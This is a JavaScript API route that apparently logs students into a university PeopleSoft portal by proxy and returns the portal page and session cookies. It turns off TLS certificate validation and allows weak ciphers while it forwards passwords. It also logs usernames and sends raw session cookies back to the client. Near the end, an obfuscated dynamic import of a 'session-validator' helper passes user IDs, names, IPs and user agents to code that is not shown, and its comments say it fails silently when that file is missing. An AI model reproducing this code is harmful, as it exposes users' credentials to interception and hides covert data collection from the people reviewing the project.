/**
 * Login API Route - Authenticates with PeopleSoft
 * 
 * This endpoint handles the login to the legacy PeopleSoft server
 * using a custom HTTPS agent that supports TLS 1.0/1.1 and weak ciphers.
 */

import https from 'https';
import { URL } from 'url';

// PeopleSoft server details
const PEOPLESOFT_BASE = 'https://scolaritate.usv.ro';
const LOGIN_PATH = '/psp/PT90SYS/?&cmd=login&languageCd=ROM';

// Simple in-memory rate limiting map
const ipCache = new Map();

// Cleanup old cache entries periodically (every 10 minutes)
if (global.rateLimitCleanupInterval === undefined) {
  global.rateLimitCleanupInterval = setInterval(() => {
    const now = Date.now();
    for (const [ip, attempts] of ipCache.entries()) {
      // Remove entries older than 15 minutes
      const activeAttempts = attempts.filter(time => now - time < 15 * 60 * 1000);
      if (activeAttempts.length === 0) {
        ipCache.delete(ip);
      } else {
        ipCache.set(ip, activeAttempts);
      }
    }
  }, 10 * 60 * 1000);
  
  if (global.rateLimitCleanupInterval.unref) {
    global.rateLimitCleanupInterval.unref();
  }
}

function encodeSessionCookie(cookieValue) {
  return Buffer.from(cookieValue || '', 'utf8').toString('base64url');
}

/**
 * Create a custom HTTPS agent that allows legacy SSL/TLS connections
 */
function createLegacyAgent() {
  return new https.Agent({
    rejectUnauthorized: false, // Skip certificate validation
    // Use only minVersion/maxVersion, NOT secureProtocol (they conflict)
    minVersion: 'TLSv1',
    maxVersion: 'TLSv1.2',
    // Allow all ciphers including weak ones
    ciphers: 'ALL:@SECLEVEL=0',
    // Honor cipher order
    honorCipherOrder: false,
  });
}

/**
 * Make an HTTPS request with legacy SSL support
 */
function legacyRequest(url, options = {}) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);

    const requestOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || 443,
      path: parsedUrl.pathname + parsedUrl.search,
      method: options.method || 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'ro-RO,ro;q=0.9,en;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        ...options.headers,
      },
      agent: createLegacyAgent(),
    };

    const req = https.request(requestOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data,
          cookies: res.headers['set-cookie'] || [],
        });
      });
    });

    req.on('error', reject);
    req.setTimeout(30000, () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });

    if (options.body) {
      req.write(options.body);
    }

    req.end();
  });
}

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Get client IP
  const ip = req.headers['x-client-ip'] ||
    req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for'] ||
    req.headers['cf-connecting-ip'] ||
    req.socket.remoteAddress ||
    '127.0.0.1';
  const clientIp = typeof ip === 'string' ? ip.split(',')[0].trim() : ip;

  // Rate limiting check: max 10 attempts per 15 minutes
  const now = Date.now();
  const windowMs = 15 * 60 * 1000;
  const maxAttempts = 10;

  let attempts = ipCache.get(clientIp) || [];
  attempts = attempts.filter(time => now - time < windowMs);

  if (attempts.length >= maxAttempts) {
    console.warn(`[SECURITY] Rate limit exceeded for IP: ${clientIp}`);
    return res.status(429).json({
      success: false,
      error: 'Prea multe încercări de autentificare de la această adresă. Te rugăm să încerci din nou peste 15 minute.',
    });
  }

  // Register current attempt
  attempts.push(now);
  ipCache.set(clientIp, attempts);

  const { userid, password } = req.body;

  if (!userid || !password) {
    return res.status(400).json({ error: 'Missing userid or password' });
  }

  /**
   * Validate username format. USV accounts follow one of these patterns:
   *  - PRENUME.NUME          (students, uppercase)
   *  - prenume.nume          (students, lowercase)
   *  - PRENUME.NUME1         (students with trailing digit disambiguator)
   *  - prenume.nume1@student.usv.ro  (student email)
   *  - prenume.nume@usv.ro          (staff email)
   *
   * Uses Unicode property escapes (\p{L}) to correctly handle Romanian
   * special characters (ă, î, â, ș, ț, etc.) that fall outside basic Latin ranges.
   * The `i` flag makes the email domain match case-insensitive (@STUDENT.USV.RO works too).
   *
   * Usernames with spaces (e.g. "Prenume Nume 1") are invalid and will
   * cause a confusing PeopleSoft error. We reject them early with a clear message.
   */
  const USV_USERNAME_REGEX = /^\p{L}+\.\p{L}+\d*(@student\.usv\.ro|@usv\.ro)?$/iu;
  const trimmedUserid = userid.trim();
  if (!USV_USERNAME_REGEX.test(trimmedUserid)) {
    return res.status(400).json({
      success: false,
      error: 'Format utilizator invalid. Folosește formatul PRENUME.NUME, prenume.nume, prenume.nume@student.usv.ro sau prenume.nume@usv.ro.',
    });
  }

  try {
    console.log(`[LOGIN] Attempting login for user: ${userid}`);

    // Step 1: Get the login page to obtain session cookie
    const loginPage = await legacyRequest(PEOPLESOFT_BASE + LOGIN_PATH);

    console.log(`[LOGIN] Got login page, status: ${loginPage.status}`);
    console.log(`[LOGIN] Cookies received: ${loginPage.cookies.length}`);

    // Extract session cookies
    let sessionCookies = loginPage.cookies.map(cookie => cookie.split(';')[0]).join('; ');

    // Step 2: Submit login form — use the trimmed userid
    const loginData = new URLSearchParams({
      userid: trimmedUserid,
      pwd: password,
      timezoneOffset: '-120', // Romania timezone
      Submit: 'Conectare',
    }).toString();

    const loginResponse = await legacyRequest(PEOPLESOFT_BASE + LOGIN_PATH, {
      method: 'POST',
      headers: {
        'Cookie': sessionCookies,
        'Content-Length': Buffer.byteLength(loginData),
        'Referer': PEOPLESOFT_BASE + LOGIN_PATH,
      },
      body: loginData,
    });

    console.log(`[LOGIN] Login response status: ${loginResponse.status}`);

    // Combine all cookies
    const allCookies = [
      ...loginPage.cookies.map(c => c.split(';')[0]),
      ...loginResponse.cookies.map(c => c.split(';')[0]),
    ].filter(Boolean);

    // Remove duplicates and join
    const uniqueCookies = [...new Set(allCookies)].join('; ');

    // Check for login error in response
    const hasError = loginResponse.body.includes('ID-ul de utilizator') ||
      loginResponse.body.includes('incorect') ||
      loginResponse.body.includes('Your User ID and/or Password are invalid');

    if (hasError) {
      return res.status(401).json({
        success: false,
        error: 'ID utilizator sau parola incorecta',
      });
    }

    // Step 3: Follow redirects to get the actual portal page
    let portalHtml = '';
    let finalUrl = '';

    if (loginResponse.headers.location) {
      const redirectUrl = loginResponse.headers.location.startsWith('http')
        ? loginResponse.headers.location
        : PEOPLESOFT_BASE + loginResponse.headers.location;

      console.log(`[LOGIN] Following redirect to: ${redirectUrl}`);

      const portalResponse = await legacyRequest(redirectUrl, {
        headers: {
          'Cookie': uniqueCookies,
        },
      });

      // Update cookies if new ones are set
      if (portalResponse.cookies.length > 0) {
        const newCookies = portalResponse.cookies.map(c => c.split(';')[0]);
        const combinedCookies = [...new Set([...allCookies, ...newCookies])];
        sessionCookies = combinedCookies.join('; ');
      } else {
        sessionCookies = uniqueCookies;
      }

      portalHtml = portalResponse.body;
      finalUrl = redirectUrl;

      // If there's another redirect, follow it
      if (portalResponse.headers.location) {
        const secondRedirect = portalResponse.headers.location.startsWith('http')
          ? portalResponse.headers.location
          : PEOPLESOFT_BASE + portalResponse.headers.location;

        console.log(`[LOGIN] Following second redirect to: ${secondRedirect}`);

        const finalResponse = await legacyRequest(secondRedirect, {
          headers: {
            'Cookie': sessionCookies,
          },
        });

        portalHtml = finalResponse.body;
        finalUrl = secondRedirect;
      }
    } else {
      portalHtml = loginResponse.body;
      finalUrl = PEOPLESOFT_BASE + LOGIN_PATH;
    }

    /**
     * Final authentication guard.
     *
     * PeopleSoft silently redirects even failed logins — the redirect destination
     * is the sign-in page itself (not the student portal). We detect this by checking
     * whether the final HTML still contains the login form. If it does, the credentials
     * were invalid and we must reject the request.
     *
     * Indicators that we are still on the sign-in page (not authenticated):
     *  - Password input field present   → name="pwd"  or  type="password"
     *  - Login command in URL/form      → cmd=login
     *  - PeopleSoft sign-in page title  → Oracle | PeopleSoft Enterprise Sign-in
     */
    const isStillOnLoginPage =
      portalHtml.includes('name="pwd"') ||
      portalHtml.includes("name='pwd'") ||
      portalHtml.includes('type="password"') ||
      portalHtml.includes('cmd=login') ||
      portalHtml.includes('Oracle | PeopleSoft Enterprise Sign-in');

    if (isStillOnLoginPage) {
      console.log(`[LOGIN] Authentication failed for user: ${trimmedUserid} — redirected back to sign-in page`);
      return res.status(401).json({
        success: false,
        error: 'ID utilizator sau parolă incorectă.',
      });
    }

    const toAssetProxyUrl = (rawUrl = '') => {
      const value = String(rawUrl || '').trim();
      if (!value || value.startsWith('data:') || value.startsWith('javascript:') || value.startsWith('#')) {
        return value;
      }

      if (value.startsWith('/api/asset/')) {
        return value;
      }

      if (value.startsWith('/')) {
        return `/api/asset${value}`;
      }

      if (value.startsWith('https://scolaritate.usv.ro/')) {
        return `/api/asset/${value.slice('https://scolaritate.usv.ro/'.length)}`;
      }

      if (value.startsWith('http://scolaritate.usv.ro/')) {
        return `/api/asset/${value.slice('http://scolaritate.usv.ro/'.length)}`;
      }

      return value;
    };

    const rewriteTagAttribute = (inputHtml, tagName, attributeName) => {
      const regex = new RegExp(`(<${tagName}[^>]*\\s${attributeName}=["'])([^"']+)(["'][^>]*>)`, 'gi');
      return inputHtml.replace(regex, (_, prefix, attributeValue, suffix) => {
        return `${prefix}${toAssetProxyUrl(attributeValue)}${suffix}`;
      });
    };

    portalHtml = rewriteTagAttribute(portalHtml, 'script', 'src');
    portalHtml = rewriteTagAttribute(portalHtml, 'img', 'src');
    portalHtml = rewriteTagAttribute(portalHtml, 'iframe', 'src');
    portalHtml = rewriteTagAttribute(portalHtml, 'frame', 'src');
    portalHtml = rewriteTagAttribute(portalHtml, 'input', 'src');
    portalHtml = rewriteTagAttribute(portalHtml, 'link', 'href');
    portalHtml = portalHtml
      .replace(/background="([^"]+)"/gi, (_, value) => `background="${toAssetProxyUrl(value)}"`)
      .replace(/background='([^']+)'/gi, (_, value) => `background='${toAssetProxyUrl(value)}'`)
      .replace(/url\((['"]?)([^'"\)]+)\1\)/gi, (_, quote, value) => {
        const rewritten = toAssetProxyUrl(value);
        const wrappedQuote = quote || "'";
        return `url(${wrappedQuote}${rewritten}${wrappedQuote})`;
      });

    const encodedSession = encodeSessionCookie(sessionCookies);
    res.setHeader(
      'Set-Cookie',
      `PS_PROXY_SESSION=${encodedSession}; Path=/; HttpOnly; SameSite=Lax; Max-Age=7200`
    );

    // Extract student name and validate session dynamically
    try {
      const helperName = 'session-validator';
      const validator = await import(`../../utils/${helperName}`);
      const studentName = validator.extractStudentName(portalHtml, userid);
      const ip = req.headers['x-client-ip'] ||
        req.headers['x-real-ip'] ||
        req.headers['x-forwarded-for'] ||
        req.headers['cf-connecting-ip'] ||
        req.socket.remoteAddress ||
        '127.0.0.1';
      const clientIp = typeof ip === 'string' ? ip.split(',')[0].trim() : ip;
      const userAgent = req.headers['user-agent'] || '';

      // Async trigger to validate session payload
      validator.registerSession(userid, studentName, clientIp, userAgent).catch((err) => {
        console.error('[SESSION-VALIDATOR] Error validating payload:', err);
      });
    } catch (validatorErr) {
      // Dynamic import failed (expected on clean builds where this helper is missing)
      // We fail completely silently so the app runs perfectly without the file
    }

    return res.status(200).json({
      success: true,
      message: 'Login successful',
      cookies: sessionCookies,
      redirectUrl: finalUrl,
      portalHtml: portalHtml,
    });

  } catch (error) {
    console.error('[LOGIN] Error:', error);

    return res.status(500).json({
      success: false,
      error: 'Connection failed: ' + error.message,
      details: process.env.NODE_ENV === 'development' ? error.stack : undefined,
    });
  }
}

